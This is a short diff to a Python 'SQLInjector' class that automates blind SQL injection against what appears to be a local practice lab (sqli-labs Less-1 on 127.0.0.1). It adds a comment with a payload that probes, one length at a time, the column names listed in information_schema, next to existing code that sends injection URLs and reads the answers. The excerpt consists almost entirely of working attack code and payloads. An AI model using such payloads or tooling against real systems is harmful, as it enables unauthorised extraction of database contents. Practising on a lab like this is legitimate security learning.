@@ -43,6 +43,8 @@ class SQLInjector:
         while True:
             # http://127.0.0.1:8081/Less-1/?id=1' and length({0})={1} --+
             full_url = (self.url + payload_len).format(self.payload, i)
+            # http://127.0.0.1:8081/Less-1/?id=1' and length((select group_concat(column_name) \
+            # from information_schema.columns where table_schema=database()))=1 --+
             req = requests.get(full_url)
             if self.mark in req.text:
                 print("len: ", i)
